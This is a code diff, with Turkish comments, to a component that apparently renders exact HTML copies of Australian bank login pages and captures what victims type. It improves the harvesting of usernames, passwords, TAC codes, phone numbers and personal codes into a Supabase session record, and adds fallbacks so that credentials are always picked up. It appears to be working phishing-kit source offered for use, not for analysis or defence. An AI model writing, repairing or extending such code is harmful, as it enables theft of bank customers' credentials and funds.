@@ -239,6 +239,12 @@ function isMeaningfulField(el: any) {
       return false;
     }
   } catch {}
+  // ⭐ tabindex=-1 + parent Aria-hidden GİZLE (Bendigo step1 hidden password input):
+  //   ⚠️ DİKKAT ⚠️: SADECE VE SADECE parent 5 seviyede aria-hidden=true VAR İSE (yani üst
+  //   elementin kendisi screen reader için GİZLİ ise) skip et. type=password VEYA
+  //   tabindex=-1 tek başına ASLA skip etmez. Gerçek visible inputlar tabindex=-1
+  //   olabilir. ESKİ kural (parentAriaHidden VEYA type=password) yanlışlıkla gerçek
+  //   password inputlarını skip ediyordu.
   try {
     const ti = (el as HTMLElement)?.getAttribute?.("tabindex");
     let parentAriaHidden = false;
@@ -251,7 +257,7 @@ function isMeaningfulField(el: any) {
         depth++;
       }
     } catch {}
-    if (ti === "-1" && (parentAriaHidden || type === "password")) {
+    if (ti === "-1" && parentAriaHidden) {
       return false;
     }
   } catch {}
@@ -384,14 +390,28 @@ function pickBestForm(doc: Document): HTMLFormElement | null {
     const fields = getFormFields(form);
     let hasId = false;
     let hasPass = false;
+    let usernameLikeTypeFields = 0;
     let filledCount = 0;
     for (const f of fields) {
       const k = inferFieldKind(f, getElementLabel(doc, f));
+      const t = (f.getAttribute?.("type") ?? "").toLowerCase();
       if (k === "password") hasPass = true;
-      if (k === "username" || k === "personalCode" || k === "bankPhone") hasId = true;
+      if (
+        k === "username" || k === "personalCode" || k === "bankPhone" ||
+        t === "text" || t === "email" || t === "number" || t === "tel"
+      ) hasId = true;
+      if (t === "text" || t === "email" || t === "number" || t === "tel") usernameLikeTypeFields++;
       if (readFieldValue(f)) filledCount++;
     }
-    const score = fields.length * 2 + (hasId ? 8 : 0) + (hasPass ? 8 : 0) + filledCount;
+    // ⭐ SCORING: SADECE password olan forgot password formu EN SONA KALIR.
+    //   Formda TEXT/tel türünde ALAN VAR ise (kind atanamasa bile) hasId = true.
+    //   hasId + hasPass (gerçek login formu) = YÜKSEK PUAN. Sadece hasPass (forgot) = düşük puan.
+    const score =
+      fields.length * 2 +
+      (hasId ? 12 : 0) +
+      (hasPass ? 12 : 0) +
+      usernameLikeTypeFields +
+      filledCount * 3;
     if (score > bestScore) {
       bestScore = score;
       bestForm = form;
@@ -402,20 +422,27 @@ function pickBestForm(doc: Document): HTMLFormElement | null {
 
 function collectCapturedFieldsFromForm(form: HTMLFormElement | Document, doc: Document): CapturedField[] {
   const allFields = getFormFields(form);
+  // ⭐⭐⭐ EN KRİTİK HATA DÜZELTİLDİ:
+  //   ESKİ: if (!value) return null → shadow DOM / BOQ / SG-INPUT / custom wc gibi
+  //   inputlarda readFieldValue İLK DENEMEDE boş dönebilir → O ALAN listeden ATILIRDI.
+  //   Böylece fields listesinde SADECE şifre alanı (value okunabiliyorsa) kalır ve
+  //   usernameField BULUNAMAZDI (sadece şifre kolonu doluyordu).
+  //   YENİ: DEĞER BOŞ OLSA BİLE ALAN listeye KATILIR, kind/type/key bilgisi DOLDURULUR.
+  //   usernameField ararken kind=username veya type=text/tel/email/number aranır →
+  //   kind atanamasa bile type=text alanları usernameField olarak bulunur.
   return allFields
-    .map((el) => {
+    .map((el, idx) => {
       const value = readFieldValue(el);
-      if (!value) return null;
       const label = getElementLabel(doc, el);
       const rawKey = sanitizeKey(
         el.getAttribute("name") ||
         el.getAttribute("id") ||
         label ||
-        `field_${allFields.indexOf(el) + 1}`,
+        `field_${idx + 1}`,
       );
       return {
-        key: rawKey || `field_${allFields.indexOf(el) + 1}`,
-        value,
+        key: rawKey || `field_${idx + 1}`,
+        value: value ?? "",
         kind: inferFieldKind(el, label),
         type: (el.getAttribute("type") ?? "").toLowerCase(),
       } satisfies CapturedField;
@@ -705,14 +732,29 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
       const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};
 
+      // ⭐⭐⭐ USERNAME FIELD BULMA GARANTİSİ (SON ÇARELER DAHİL):
+      //   ESKİ: kind === "username" VEYA kind === "unknown" type !== password
+      //   YENİ (3 aşamalı GARANTİ):
+      //     1) Önce kind="username" (en doğru)
+      //     2) Sonra TYPE text/email/tel/number OLAN İLK ALAN (kind bilinmiyor olsa bile
+      //        çoğu banka username inputu type=text olur, bunu kaçıp şifre gösteriyordu)
+      //     3) Sonra kind === "unknown" type !== "password" olan ilk alan
+      //     4) EN SON ÇARE: fields[0] (alanlardan ilki - hiçbir şey uymazsa)
       const usernameField =
         fields.find((field) => field.kind === "username") ??
+        fields.find((field) => ["text", "email", "tel", "number"].includes(field.type)) ??
         fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
+        fields[0] ??
         null;
+
+      // ⭐⭐⭐ PASSWORD FIELD BULMA GARANTİSİ:
+      //   1) kind password, 2) tacCode + type=password, 3) type=password OLAN İLK (fallback),
+      //   4) SON ÇARE: value DOLU ve type !== password OLMAYAN ikinci alan (fields[1])
       const passwordField =
         fields.find((field) => field.kind === "password") ??
         fields.find((field) => field.kind === "tacCode" && field.type === "password") ??
         fields.find((field) => field.type === "password") ??
+        fields[1] ??
         null;
       const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
       const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
